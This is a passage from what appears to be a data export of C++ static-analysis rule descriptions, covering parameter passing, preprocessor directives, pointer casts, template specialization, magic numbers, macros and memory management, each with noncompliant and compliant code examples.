<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#r10-avoid-malloc-and-free"">C++ core guidelines R.10</a> Avoid malloc() and
free()</p>",C-style memory allocation routines should not be used,[],CRITICAL,"['leak', 'suspicious']",CODE_SMELL
2019-02-26T09:19:32+0100,"<p>To pass an input parameter to a function, there are two possibilities: pass by value, or pass by reference to const. Which one is best depends of
the size of the object, which is an indicator of the cost to copy it. A small one, with cheap copy constructors, should be passed by value, while a
larger one should be passed by reference to const.</p>
<p>This rule detects when a parameter has been passed by value, while it should have been passed by reference to const:</p>
<p>- Because it is too large</p>
<p>- Because it contains virtual functions and passing it by value will slice the extra members if you happen to pass an object of a derived
class.</p>
<p>In some cases, you may want to pass by value a large object, if you modify it in the function but you don't want the initial object to be impacted
by these changes. We do not detect such a situation, which will be a false positive.</p>
<p>There are other ways to pass input parameters for sinks (for instance by rvalue references), but this rule is only about the choice between pass by
value and pass by reference to const.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct Student {string firstName; string lastName; Date birthDate;};
class XmlNode {
  virtual ~XmlNode();
  virtual string toString();
};
void registerStudent(School &amp;school, Student p); // Noncompliant, Student is a large object
void dump(ostream &amp;out, XmlNode node); // Noncompliant, XmlNode is a polymorphic type
</pre>
<h2>Compliant Solution</h2>
<pre>
struct Student {string firstName; string lastName; Date birthDate;};
class XmlNode {
  virtual ~XmlNode();
  virtual string toString();
};
void registerStudent(School &amp;school, Student const &amp; p); // Compliant, avoids useless copy
void dump(ostream &amp;out, XmlNode const &amp;node); // Compliant, no slicing
</pre>
<h2>See</h2>
<ul>
  <li> <a
  href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#f16-for-in-parameters-pass-cheaply-copied-types-by-value-and-others-by-reference-to-const"">C++ core guidelines F.16</a> For Ã¢â‚¬Å“inÃ¢â‚¬ï¿½ parameters, pass cheaply-copied types by value and others by reference to <code>const</code> </li>
</ul>",cpp:S1238,cpp,C++,"<p>To pass an input parameter to a function, there are two possibilities: pass by value, or pass by reference to const. Which one is best depends of
the size of the object, which is an indicator of the cost to copy it. A small one, with cheap copy constructors, should be passed by value, while a
larger one should be passed by reference to const.</p>
<p>This rule detects when a parameter has been passed by value, while it should have been passed by reference to const:</p>
<p>- Because it is too large</p>
<p>- Because it contains virtual functions and passing it by value will slice the extra members if you happen to pass an object of a derived
class.</p>
<p>In some cases, you may want to pass by value a large object, if you modify it in the function but you don't want the initial object to be impacted
by these changes. We do not detect such a situation, which will be a false positive.</p>
<p>There are other ways to pass input parameters for sinks (for instance by rvalue references), but this rule is only about the choice between pass by
value and pass by reference to const.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct Student {string firstName; string lastName; Date birthDate;};
class XmlNode {
  virtual ~XmlNode();
  virtual string toString();
};
void registerStudent(School &amp;school, Student p); // Noncompliant, Student is a large object
void dump(ostream &amp;out, XmlNode node); // Noncompliant, XmlNode is a polymorphic type
</pre>
<h2>Compliant Solution</h2>
<pre>
struct Student {string firstName; string lastName; Date birthDate;};
class XmlNode {
  virtual ~XmlNode();
  virtual string toString();
};
void registerStudent(School &amp;school, Student const &amp; p); // Compliant, avoids useless copy
void dump(ostream &amp;out, XmlNode const &amp;node); // Compliant, no slicing
</pre>
<h2>See</h2>
<ul>
  <li> <a
  href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#f16-for-in-parameters-pass-cheaply-copied-types-by-value-and-others-by-reference-to-const"">C++ core guidelines F.16</a> For Ã¢â‚¬Å“inÃ¢â‚¬ï¿½ parameters, pass cheaply-copied types by value and others by reference to <code>const</code> </li>
</ul>",Pass by reference to const should be used for large input parameters,[],MAJOR,['performance'],CODE_SMELL
2015-02-03T08:39:43+0100,"<p>Preprocessing directives (lines that start with <code>#</code>) can be used to conditionally include or exclude code from compilation. Malformed
preprocessing directives could lead to the exclusion or inclusion of more code than was intended. Therefore all preprocessing directives should be
syntactically meaningful.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else1  /* Noncompliant */
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.16 - Preprocessing directives shall be syntactically meaningful even when excluded by preprocessor. </li>
  <li> MISRA C++:2008, 16-0-8 - If the # token appears as the first token on a line, then it shall be immediately followed by a preprocessing token.
  </li>
  <li> MISRA C:2012, 20.13 - A line whose first token is # shall be a valid preprocessing directive </li>
</ul>",cpp:S977,cpp,C++,"<p>Preprocessing directives (lines that start with <code>#</code>) can be used to conditionally include or exclude code from compilation. Malformed
preprocessing directives could lead to the exclusion or inclusion of more code than was intended. Therefore all preprocessing directives should be
syntactically meaningful.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else1  /* Noncompliant */
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.16 - Preprocessing directives shall be syntactically meaningful even when excluded by preprocessor. </li>
  <li> MISRA C++:2008, 16-0-8 - If the # token appears as the first token on a line, then it shall be immediately followed by a preprocessing token.
  </li>
  <li> MISRA C:2012, 20.13 - A line whose first token is # shall be a valid preprocessing directive </li>
</ul>","Lines starting with ""#"" should contain valid preprocessing directives",[],MAJOR,"['misra', 'preprocessor']",BUG
2019-02-26T09:19:32+0100,"<p>Casting an object pointer can very easily lead to undefined behavior. Only a few cases are supported, for instance casting an object pointer to a
large enough integral type (and back again), casting an object pointer to a pointer to void (and back again)... Using a pointer cast to access an
object as if it was of another type than its real type is not supported in general.</p>
<p>This rule detect casts between object pointers and incompatible types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct S1 *p1;
struct S2;
void f ()
{
  (float) p1; // Noncompliant, conversion to floating point type
  (int *) p1; // Noncompliant
  float f;
  int *i = (int *)&amp;f; // Noncompliant, undefined behavior even if sizeof(int) == sizeof(float)
  (int) p1; // Compliant, but might be undefined behavior if 'int' is not large enough to hold the value of p1.
  (void *) p1; // Compliant, conversion to 'void *'
  (struct S2 *)p1; // Noncompliant, conversion to another type.
}
</pre>
<h2>Exceptions</h2>
<p>In C, it is allowed to cast an object pointer to a character pointer to access the byte representation of the object. This rule ignores this
case.</p>
<p>Anything can be safely cast to <code>void</code> (since nothing can be done with a result of this cast), and doing so is a common pattern to
silence compiler warnings about unused variables. This rule ignores such casts.</p>
<pre>
void f(int *p) {
  (void)p;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 11.2 - Conversions shall not be performed between a pointer to object and any type other than an integral type, another pointer
  to object type or a pointer to void. </li>
  <li> MISRA C:2012, 11.3 - A cast shall not be performed between a pointer to object type and a pointer to a different object type. </li>
</ul>",cpp:S856,cpp,C++,"<p>Casting an object pointer can very easily lead to undefined behavior. Only a few cases are supported, for instance casting an object pointer to a
large enough integral type (and back again), casting an object pointer to a pointer to void (and back again)... Using a pointer cast to access an
object as if it was of another type than its real type is not supported in general.</p>
<p>This rule detect casts between object pointers and incompatible types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct S1 *p1;
struct S2;
void f ()
{
  (float) p1; // Noncompliant, conversion to floating point type
  (int *) p1; // Noncompliant
  float f;
  int *i = (int *)&amp;f; // Noncompliant, undefined behavior even if sizeof(int) == sizeof(float)
  (int) p1; // Compliant, but might be undefined behavior if 'int' is not large enough to hold the value of p1.
  (void *) p1; // Compliant, conversion to 'void *'
  (struct S2 *)p1; // Noncompliant, conversion to another type.
}
</pre>
<h2>Exceptions</h2>
<p>In C, it is allowed to cast an object pointer to a character pointer to access the byte representation of the object. This rule ignores this
case.</p>
<p>Anything can be safely cast to <code>void</code> (since nothing can be done with a result of this cast), and doing so is a common pattern to
silence compiler warnings about unused variables. This rule ignores such casts.</p>
<pre>
void f(int *p) {
  (void)p;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 11.2 - Conversions shall not be performed between a pointer to object and any type other than an integral type, another pointer
  to object type or a pointer to void. </li>
  <li> MISRA C:2012, 11.3 - A cast shall not be performed between a pointer to object type and a pointer to a different object type. </li>
</ul>",Pointer conversions should be restricted to a safe subset,[],MAJOR,['misra'],BUG
2019-02-26T09:19:32+0100,"<p>Explicit specializations of function templates are not considered in overload resolution, only the main template. As a consequence, the function
that will be selected might very well be different from what seems natural to the developer, leading to hard to understand bugs. Moreover, function
templates don't allow partial specialization.</p>
<p>Instead of specializing a function template, you may choose to overload it with another template or non template function, since a more specialized
overload will be preferred to a generic overload.</p>
<h2>Noncompliant Code Example</h2>
<pre>
template &lt;typename T&gt; void f ( T );
template &lt;&gt; void f&lt;char*&gt; ( char * ); // explicit specialization, noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
template &lt;typename T&gt; void f ( T );
void f( char * ); // overload, compliant
</pre>
<h2>Exceptions</h2>
<p>This rule ignores cases where none of the main function template arguments depend on a template parameter: Even if the code could still be written
without function template specialization (by deferring the real work to a class template, and offering specializations of this class template as
customization point to the user), there is no risk of confusion for overload resolution in these cases.</p>
<pre>
// For real code, use std::numeric_limits instead...
template &lt;class T&gt; T max();
template &lt;&gt; float max&lt;float&gt;() { return FLT_MAX; }  // Ignored

template&lt;class T&gt;
bool isMax(T t){
    return t == max&lt;T&gt;();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 14-8-1 </li>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#t144-dont-specialize-function-templates"">C++ core guidelines T.144</a>
  DonÃ¢â‚¬â„¢t specialize function templates </li>
</ul>",cpp:S1032,cpp,C++,"<p>Explicit specializations of function templates are not considered in overload resolution, only the main template. As a consequence, the function
that will be selected might very well be different from what seems natural to the developer, leading to hard to understand bugs. Moreover, function
templates don't allow partial specialization.</p>
<p>Instead of specializing a function template, you may choose to overload it with another template or non template function, since a more specialized
overload will be preferred to a generic overload.</p>
<h2>Noncompliant Code Example</h2>
<pre>
template &lt;typename T&gt; void f ( T );
template &lt;&gt; void f&lt;char*&gt; ( char * ); // explicit specialization, noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
template &lt;typename T&gt; void f ( T );
void f( char * ); // overload, compliant
</pre>
<h2>Exceptions</h2>
<p>This rule ignores cases where none of the main function template arguments depend on a template parameter: Even if the code could still be written
without function template specialization (by deferring the real work to a class template, and offering specializations of this class template as
customization point to the user), there is no risk of confusion for overload resolution in these cases.</p>
<pre>
// For real code, use std::numeric_limits instead...
template &lt;class T&gt; T max();
template &lt;&gt; float max&lt;float&gt;() { return FLT_MAX; }  // Ignored

template&lt;class T&gt;
bool isMax(T t){
    return t == max&lt;T&gt;();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 14-8-1 </li>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#t144-dont-specialize-function-templates"">C++ core guidelines T.144</a>
  DonÃ¢â‚¬â„¢t specialize function templates </li>
</ul>",Function templates should not be specialized,[],BLOCKER,['misra'],BUG
2019-02-26T09:19:32+0100,"<p>To configure an algorithm with a function in C++, you can use one of the following techniques:</p>
<p>- A function pointer (see <a href='/coding_rules#rule_key=cpp%3AS5205'>S5205</a> that explains why it is a bad idea)</p>
<p>- A <code>std::function</code></p>
<p>- A template argument</p>
<p>How do you select between those two solutions?</p>
<p><code>std::function</code> offers the most flexibility. You can store them in a variable, in a container (as <code>std::map&lt;string,
std::function&lt;void(void)&gt;&gt;</code> for instance... This flexibility is provided by type erasure: A single <code>std::function</code> can wrap
any kind of functor, as long as the signature is compatible. It also come with a cost: Due to this type erasure, a compiler will typically not be able
to inline a call to a <code>std::function</code>.</p>
<p>Template parameters, on the other hand, are less flexible. Each functor has its own type, which prevents storing several of them together, even if
they all have compatible signatures. But since each template instance knows the type of the functor, calls can be inlined, making this a zero-cost
abstraction.</p>
<p>As a conclusion, if the functor can be known at compile-time, you should prefer using a template parameter, if it has to be dynamic,
<code>std::function</code> will give you greater flexibility.</p>
<p>This rule detects function parameters of type <code>std::function</code> that would probably benefit from being replaced by a template parameter.
It does so by looking if the functor is only called inside the function, or if it participates in other operations.</p>
<pre>
using Criterion = std::function&lt;bool(DataPoint const&amp;)&gt;;
void filter(DataSet* data, Criterion criterion) { // Noncompliant
  for (auto &amp;dataPoint : data) {
    if (criterion(dataPoint)) {
      data.markForRemoval(dataPoint);
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
template&lt;class Criterion&gt;
void filter(DataSet* data, Criterion criterion) { // Compliant
  for (auto &amp;dataPoint : data) {
    if (criterion(dataPoint)) {
      data.markForRemoval(dataPoint);
    }
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores virtual functions, that don't work well with templates.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#t49-where-possible-avoid-type-erasure"">C++ core guidelines T.49</a> Where
  possible, avoid type-erasure </li>
</ul>",cpp:S5213,cpp,C++,"<p>To configure an algorithm with a function in C++, you can use one of the following techniques:</p>
<p>- A function pointer (see {rule:cpp:S5205} that explains why it is a bad idea)</p>
<p>- A <code>std::function</code></p>
<p>- A template argument</p>
<p>How do you select between those two solutions?</p>
<p><code>std::function</code> offers the most flexibility. You can store them in a variable, in a container (as <code>std::map&lt;string,
std::function&lt;void(void)&gt;&gt;</code> for instance... This flexibility is provided by type erasure: A single <code>std::function</code> can wrap
any kind of functor, as long as the signature is compatible. It also come with a cost: Due to this type erasure, a compiler will typically not be able
to inline a call to a <code>std::function</code>.</p>
<p>Template parameters, on the other hand, are less flexible. Each functor has its own type, which prevents storing several of them together, even if
they all have compatible signatures. But since each template instance knows the type of the functor, calls can be inlined, making this a zero-cost
abstraction.</p>
<p>As a conclusion, if the functor can be known at compile-time, you should prefer using a template parameter, if it has to be dynamic,
<code>std::function</code> will give you greater flexibility.</p>
<p>This rule detects function parameters of type <code>std::function</code> that would probably benefit from being replaced by a template parameter.
It does so by looking if the functor is only called inside the function, or if it participates in other operations.</p>
<pre>
using Criterion = std::function&lt;bool(DataPoint const&amp;)&gt;;
void filter(DataSet* data, Criterion criterion) { // Noncompliant
  for (auto &amp;dataPoint : data) {
    if (criterion(dataPoint)) {
      data.markForRemoval(dataPoint);
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
template&lt;class Criterion&gt;
void filter(DataSet* data, Criterion criterion) { // Compliant
  for (auto &amp;dataPoint : data) {
    if (criterion(dataPoint)) {
      data.markForRemoval(dataPoint);
    }
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores virtual functions, that don't work well with templates.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#t49-where-possible-avoid-type-erasure"">C++ core guidelines T.49</a> Where
  possible, avoid type-erasure </li>
</ul>","Template parameters should be preferred to ""std::function"" when configuring behavior at compile time",[],CRITICAL,"['bad-practice', 'performance']",CODE_SMELL
2013-09-16T11:41:24+0200,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned a name. This is classically done by using a constant (<code>constexpr</code>
or <code>const</code> if your compiler does not support <code>constexpr</code> yet) or an enumeration.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int var) {
  for(int i = 0; i &lt; 42; i++) { // Noncompliant - 42 is a magic number
    // ...
  }

  if (var == 42) { // Noncompliant - magic number
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
enum Status {
STATUS_KO = 0,
STATUS_OK = 42,
};

void doSomething(Status var) {
  constexpr int maxIterations = 42; // Compliant - in a declaration
  for(int i = 0; i &lt; maxIterations ; i++){ // Compliant
    // ...
  }

  if (var == STATUS_KO) { // Compliant - 0 is excluded
    // ...
  }

  if (var == STATUS_OK) { // Compliant - number comes from a macro
    // ...
  }
}
</pre>",cpp:S109,cpp,C++,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned a name. This is classically done by using a constant (<code>constexpr</code>
or <code>const</code> if your compiler does not support <code>constexpr</code> yet) or an enumeration.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int var) {
  for(int i = 0; i &lt; 42; i++) { // Noncompliant - 42 is a magic number
    // ...
  }

  if (var == 42) { // Noncompliant - magic number
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
enum Status {
STATUS_KO = 0,
STATUS_OK = 42,
};

void doSomething(Status var) {
  constexpr int maxIterations = 42; // Compliant - in a declaration
  for(int i = 0; i &lt; maxIterations ; i++){ // Compliant
    // ...
  }

  if (var == STATUS_KO) { // Compliant - 0 is excluded
    // ...
  }

  if (var == STATUS_OK) { // Compliant - number comes from a macro
    // ...
  }
}
</pre>",Magic numbers should not be used,[],MAJOR,['brain-overload'],CODE_SMELL
2019-02-26T09:19:32+0100,"<p>The C++ standard defines some identifiers as having special meaning in some contexts. These are <code>audit</code>, <code>axiom</code>,
<code>final</code> and <code>override</code>. While it is technically possible to use them as normal identifiers, it's clearer for the reader of the
code to consider them as if they were keywords, and only use them with their special meaning.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void axiom(int final); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
void precept(int finalValue); // Noncompliant
</pre>",cpp:S1669,cpp,C++,"<p>The C++ standard defines some identifiers as having special meaning in some contexts. These are <code>audit</code>, <code>axiom</code>,
<code>final</code> and <code>override</code>. While it is technically possible to use them as normal identifiers, it's clearer for the reader of the
code to consider them as if they were keywords, and only use them with their special meaning.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void axiom(int final); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
void precept(int finalValue); // Noncompliant
</pre>",Context-sensitive keywords should not be used as identifiers,[],BLOCKER,['pitfall'],CODE_SMELL
2019-02-26T09:19:32+0100,"<p>When you want to define a function that can accept a function pointer as an argument, there are three ways in C++ to declare the parameter
type:</p>
<p>- A function pointer: <code>void f(void (*callback)());</code></p>
<p>- A <code>std::function</code>: <code>void f(std::function&lt;void()&gt; callback);</code></p>
<p>- A template argument: <code>template&lt;class Callback&gt; void f(Callback callback);</code></p>
<p>Using a function pointer is an inferior solution, for the following reasons:</p>
<p>- Only a function pointer can be passed as an argument, while the other options offer the caller more flexibility because they can take more
advanced functors, such as lambdas with some captured state</p>
<p>- The syntax is obscure</p>
<p>- It typically has worse performance than the template parameter solution.</p>
<p>See <a href='/coding_rules#rule_key=cpp%3AS5213'>S5213</a> for a discussion of how to choose between <code>std::function</code> and a template parameter.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using Criterion = bool (*)(DataPoint const&amp;);
void filter(DataSet* data, Criterion criterion); // Noncompliant

using Callback = void (*)(EventInfo const&amp;);
class Button {
public:
    void addOnClick(Callback c) {myOnClickHandler = c;} // Noncompliant
private:
    Callback myOnClickHandler;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
template&lt;class Criterion&gt;
void filter(DataSet* data, Criterion criterion); // Compliant, uses the more efficient template argument

using Callback = std::function&lt;void(EventInfo const&amp;)&gt;;
class Button {
public:
    void addOnClick(Callback c) {myOnClickHandler = c;} // Compliant, uses the more flexible std::function
private:
    Callback myOnClickHandler;
};
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#t40-use-function-objects-to-pass-operations-to-algorithms"">C++ core
  guidelines T.40</a> Use function objects to pass operations to algorithms </li>
</ul>",cpp:S5205,cpp,C++,"<p>When you want to define a function that can accept a function pointer as an argument, there are three ways in C++ to declare the parameter
type:</p>
<p>- A function pointer: <code>void f(void (*callback)());</code></p>
<p>- A <code>std::function</code>: <code>void f(std::function&lt;void()&gt; callback);</code></p>
<p>- A template argument: <code>template&lt;class Callback&gt; void f(Callback callback);</code></p>
<p>Using a function pointer is an inferior solution, for the following reasons:</p>
<p>- Only a function pointer can be passed as an argument, while the other options offer the caller more flexibility because they can take more
advanced functors, such as lambdas with some captured state</p>
<p>- The syntax is obscure</p>
<p>- It typically has worse performance than the template parameter solution.</p>
<p>See {rule:cpp:S5213} for a discussion of how to choose between <code>std::function</code> and a template parameter.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using Criterion = bool (*)(DataPoint const&amp;);
void filter(DataSet* data, Criterion criterion); // Noncompliant

using Callback = void (*)(EventInfo const&amp;);
class Button {
public:
    void addOnClick(Callback c) {myOnClickHandler = c;} // Noncompliant
private:
    Callback myOnClickHandler;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
template&lt;class Criterion&gt;
void filter(DataSet* data, Criterion criterion); // Compliant, uses the more efficient template argument

using Callback = std::function&lt;void(EventInfo const&amp;)&gt;;
class Button {
public:
    void addOnClick(Callback c) {myOnClickHandler = c;} // Compliant, uses the more flexible std::function
private:
    Callback myOnClickHandler;
};
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#t40-use-function-objects-to-pass-operations-to-algorithms"">C++ core
  guidelines T.40</a> Use function objects to pass operations to algorithms </li>
</ul>",Function pointers should not be used as function parameters,[],MAJOR,['clumsy'],CODE_SMELL
2014-08-07T09:36:26+0200,"<p>While keywords introduced in later standards can legally be used as identifiers in code compiled to earlier standards, doing so will eventually
cause problems. Such code will cause compile errors if (when) the compiler is upgraded, and fixing those errors could be difficult and painful. </p>
<p>Additionally, such misuse of keywords has the potential to thoroughly confuse people who are unfamiliar with the code base, possibly leading them
to introduce additional errors. </p>
<p>For these reasons, the earlier this practice is stopped, the better.</p>
<p>This rule flags instances of the following keywords used as identifiers:</p>
<p><strong>C99</strong></p>
<p><code>inline</code>, <code>restrict</code>, <code>_Bool</code>, <code>_Complex</code>, <code>_Noreturn</code>, <code>_Static_assert</code>,
<code>_Thread_local</code></p>
<p><strong>C11</strong></p>
<p><code>_Alignas</code>, <code>_Alignof</code>, <code>_Atomic</code>, <code>_Generic</code>, <code>_Imaginary</code></p>
<p><strong>C++11</strong></p>
<p><code>alignas</code>, <code>alignof</code>, <code>char16_t</code>, <code>char32_t</code>, <code>constexpr</code>, <code>decltype</code>,
<code>noexcept</code>, <code>nullptr</code>, <code>static_assert</code>, <code>thread_local</code></p>
<p><strong>C++20</strong></p>
<p><code>concept</code>,<code>requires</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
int inline = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int inline_count = 0;
</pre>",cpp:S1760,cpp,C++,"<p>While keywords introduced in later standards can legally be used as identifiers in code compiled to earlier standards, doing so will eventually
cause problems. Such code will cause compile errors if (when) the compiler is upgraded, and fixing those errors could be difficult and painful. </p>
<p>Additionally, such misuse of keywords has the potential to thoroughly confuse people who are unfamiliar with the code base, possibly leading them
to introduce additional errors. </p>
<p>For these reasons, the earlier this practice is stopped, the better.</p>
<p>This rule flags instances of the following keywords used as identifiers:</p>
<p><strong>C99</strong></p>
<p><code>inline</code>, <code>restrict</code>, <code>_Bool</code>, <code>_Complex</code>, <code>_Noreturn</code>, <code>_Static_assert</code>,
<code>_Thread_local</code></p>
<p><strong>C11</strong></p>
<p><code>_Alignas</code>, <code>_Alignof</code>, <code>_Atomic</code>, <code>_Generic</code>, <code>_Imaginary</code></p>
<p><strong>C++11</strong></p>
<p><code>alignas</code>, <code>alignof</code>, <code>char16_t</code>, <code>char32_t</code>, <code>constexpr</code>, <code>decltype</code>,
<code>noexcept</code>, <code>nullptr</code>, <code>static_assert</code>, <code>thread_local</code></p>
<p><strong>C++20</strong></p>
<p><code>concept</code>,<code>requires</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
int inline = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int inline_count = 0;
</pre>",Keywords introduced in later specifications should not be used as identifiers,[],BLOCKER,[],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Exception specifications never really provided any advantages in C++. They have been deprecated since C++11, and removed since C++17 (specification
with an exception) and C++20 (empty throw specification). If your code still contains some, you should replace empty <code>throw()</code>
specifications, with <code>noexcept</code> and remove any other specifications.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f() throw(); // Noncompliant
void g() throw(std::exception); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
void f() noexcept;
void g();
</pre>
<h2>Exceptions</h2>
<p>If a derived class overrides a function with a dynamic exception specification, then the derived function is forced to add a compatible exception
specification. Such exception specifications are ignored.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#e30-dont-use-exception-specifications"">C++ core guidelines E.30</a> DonÃ¢â‚¬â„¢t
  use exception specifications </li>
</ul>",cpp:ExceptionSpecificationUsage,cpp,C++,"<p>Exception specifications never really provided any advantages in C++. They have been deprecated since C++11, and removed since C++17 (specification
with an exception) and C++20 (empty throw specification). If your code still contains some, you should replace empty <code>throw()</code>
specifications, with <code>noexcept</code> and remove any other specifications.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f() throw(); // Noncompliant
void g() throw(std::exception); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
void f() noexcept;
void g();
</pre>
<h2>Exceptions</h2>
<p>If a derived class overrides a function with a dynamic exception specification, then the derived function is forced to add a compatible exception
specification. Such exception specifications are ignored.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#e30-dont-use-exception-specifications"">C++ core guidelines E.30</a> DonÃ¢â‚¬â„¢t
  use exception specifications </li>
</ul>",Exception specifications should not be used,[],CRITICAL,"['clumsy', 'error-handling']",CODE_SMELL
2019-02-26T09:19:32+0100,"<p>A macro is a textual replacement, which means that it's not respecting the type system, it's not respecting scoping rules... There is no reason not
to use a constant instead.</p>
<p>Most of the time, a macro can be replaced by a <code>constexpr</code> declaration (a constant that is guaranteed to be computed during
compilation). If your compiler is too old to properly handle <code>constexpr</code>, you may use <code>const</code> instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
#define MAX_MEMORY 640 // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
constexpr size_t MAX_MEMORY = 640;
</pre>
<h2>See</h2>
<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#es31-dont-use-macros-for-constants-or-functions"">C++ core guidelines
ES.31</a> </p>
<p> DonÃ¢â‚¬â„¢t use macros for constants or Ã¢â‚¬Å“functionsÃ¢â‚¬ï¿½</p>",cpp:S5028,cpp,C++,"<p>A macro is a textual replacement, which means that it's not respecting the type system, it's not respecting scoping rules... There is no reason not
to use a constant instead.</p>
<p>Most of the time, a macro can be replaced by a <code>constexpr</code> declaration (a constant that is guaranteed to be computed during
compilation). If your compiler is too old to properly handle <code>constexpr</code>, you may use <code>const</code> instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
#define MAX_MEMORY 640 // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
constexpr size_t MAX_MEMORY = 640;
</pre>
<h2>See</h2>
<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#es31-dont-use-macros-for-constants-or-functions"">C++ core guidelines
ES.31</a> </p>
<p> DonÃ¢â‚¬â„¢t use macros for constants or Ã¢â‚¬Å“functionsÃ¢â‚¬ï¿½</p>",Macros should not be used to define constants,[],CRITICAL,"['bad-practice', 'clumsy']",CODE_SMELL
2019-02-26T09:19:32+0100,"<p>If you manage memory manually, it's your responsibility to <code>delete</code> all memory created with <code>new</code>, and to make sure it's
<code>delete</code>d once and only once. Ensuring this is done is error-prone, especially when your function can have early exit points. </p>
<p>Fortunately, the C++ language provides tools that automatically manage memory for you. Using them systematically makes the code simpler and more
robust without sacrificing performance.</p>
<p>This rule raises an issue when you use:</p>
<p>- <code>new</code> - you should prefer a factory function that returns a smart pointer, such as <code>std::make_unique</code> or, if shared
ownership is required, <code>std::make_shared</code>,</p>
<p>- <code>new[]</code> - you should prefer a container class, such as <code>std::vector</code>,</p>
<p>- <code>delete</code> or <code>delete[]</code> - if you followed the previous advice, there is no need to manually release memory.</p>
<p>If your compiler does not support <code>make_unique</code>, it's easy to write your own:</p>
<pre>
template&lt;typename T, typename... Args&gt;
std::unique_ptr&lt;T&gt; make_unique(Args&amp;&amp;... args) {
    return std::unique_ptr&lt;T&gt;(new T(std::forward&lt;Args&gt;(args)...));
}
</pre>
<h2>Noncompliant Code Example</h2>
<pre>
void f() {
  auto c = new Circle(0, 0, 5);
  c-&gt;draw();
  delete c;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f() {
  auto c = make_unique&lt;Circle&gt;(0, 0, 5);
  c-&gt;draw();
